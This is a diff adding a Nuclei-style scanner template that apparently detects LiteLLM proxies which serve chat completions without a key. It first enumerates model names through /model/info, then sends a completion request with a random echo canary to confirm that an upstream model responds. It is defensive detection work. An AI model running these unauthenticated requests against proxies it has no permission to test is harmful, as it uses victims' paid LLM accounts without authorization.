@@ -1,0 +1,91 @@
+# gap: litellm-anonymous-completions-canary
+id: litellm-anonymous-completions-canary
+
+info:
+  name: LiteLLM Anonymous Chat Completions - Canary Echo (active-exploit primitive)
+  author: TyrusRC
+  severity: high
+  description: |
+    Confirms that an exposed LiteLLM proxy server (BerriAI) not
+    only lists its routed upstream model catalog anonymously but
+    actively forwards inference requests to the upstream
+    provider (OpenAI / Anthropic / Azure / Bedrock / local LLMs)
+    without requiring a virtual key or master key. This turns
+    detection from "model catalog disclosed" into proof of
+    "anyone can rack up upstream LLM costs on your accounts."
+
+    Differentiates from upstream's `litellm-unauth-model-exposure`
+    (which only probes `/model/info` for catalog presence). This
+    is the active-exploit primitive following batch-35 style:
+
+    Step 1: GET `/model/info` enumerate a model name for routing.
+    Step 2: POST `/chat/completions` with an OpenAI-compatible
+            instruct-and-echo canary payload. The canary
+            `NUCLITE{rand}` is unguessable — a routine echo
+            cannot produce it. Matcher requires the canary
+            appears in the `"content":` JSON field of the
+            assistant message.
+
+    Two facts confirmed: (1) endpoint accepts unauth completions,
+    (2) the route reaches a live upstream model that follows
+    instructions. = exploitable LiteLLM proxy.
+  reference:
+    - https://docs.litellm.ai/docs/proxy/configs
+    - https://docs.litellm.ai/docs/proxy/virtual_keys
+    - https://github.com/BerriAI/litellm
+  tags: custom,vulnerabilities,litellm,llm,ai,unauth,inference,cwe-862
+
+variables:
+  canary: "NUCLITE{{rand_text_alpha(10)}}"
+
+http:
+  - raw:
+      # Step 1: list routed models
+      - |
+        GET /model/info HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+
+      # Step 2: invoke chat completions with instruct-and-echo
+      - |
+        POST /chat/completions HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+
+        {"model":"{{model_name}}","messages":[{"role":"user","content":"Reply with exactly this token and nothing else: {{canary}}"}],"max_tokens":32,"stream":false}
+
+    req-condition: true
+    extractors:
+      - type: regex
+        part: body_1
+        name: model_name
+        internal: true
+        regex:
+          - '"model_name"\s*:\s*"([^"]{1,100})"'
+        group: 1
+      - type: regex
+        part: body_2
+        name: leaked-canary
+        regex:
+          - '"content"\s*:\s*"([^"]{0,200}NUCLITE[A-Za-z]{10}[^"]{0,200})"'
+        group: 1
+      - type: regex
+        part: body_1
+        name: exposed-models
+        regex:
+          - '"model_name"\s*:\s*"([^"]{1,100})"'
+        group: 1
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'contains(body_1, "\"litellm_params\"")'
+          - 'contains(body_1, "\"model_info\"")'
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(body_2, canary)'
+          - 'contains(body_2, "\"content\"") || contains(body_2, "\"choices\"")'
